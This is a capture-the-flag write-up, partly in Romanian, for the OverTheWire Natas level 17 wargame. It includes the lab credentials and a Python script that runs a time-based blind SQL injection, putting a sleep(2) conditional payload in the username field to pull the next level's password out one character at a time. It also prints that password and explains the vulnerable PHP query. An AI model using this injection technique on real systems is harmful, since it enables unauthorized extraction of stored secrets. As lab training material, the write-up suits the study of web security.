
# General info

Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL:      http://natas17.natas.labs.overthewire.org

# Special code section

```py
import time
import string

alphabet = string.digits + string.ascii_letters

password = ""

while len(password) != 64:
    old_password = password
    for char in alphabet:

        now = time.time()
        response = requests.post(
            url=link,
            auth=("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"),
            data={
                "username" : f"natas18\" and if(substr(password, 1, {len(password) + 1}) like binary '{password+char}%', sleep(2), 0) -- "
            }
        )

        now = time.time() - now
        now = int(now)

        if now == 2:
            password += char
            print(password) # 6oG1pBKdvJYblpxGd4dDbrG6zLlCGgCJ
    
    if old_password == password:
        print("no new password found. exiting")
        break
```


Asta e tot un **Blind SQL Injection**, dar de data asta e timed based.

Initial, m-am uitat la cookies, response si headers, dar nu era nimic diferit.
Asa ca l-am intrebat pe gepeto daca aceste doua linii
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
$res = mysqli_query($link, $query);
```
ar putea da vreo informatie unui atacator
asa am aflat ca, doar pe baza textului, sunt slabe sansele - daca nu se modifica nimic pe pagina, atunci nu are de unde sa stie daca s-a rulat query-ul sau nu.
totusi, ce poate afla insa este timpul de raspuns - cat de repede raspunde serverul.
am verificat initial, dar response time-ul era de 0.13-0.15 secunde, atat pentru raspunsuri cu rezultate, cat si pentru raspunsuri empty.

n am inteles initial asta, dar dupa o explicatie in care mi-a aratat ca `if(substr(), sleep(2), 0)` iti poate da _timp de executie diferit_ in functie de acel `substr`, am inteles la ce se refera si am folosit o


LE: aparent acel `=` nu era bun in query, trebuie folosit `like binary` pt ca asa compari caracter cu caracter. In schimb, by default, `=` e case insensitve.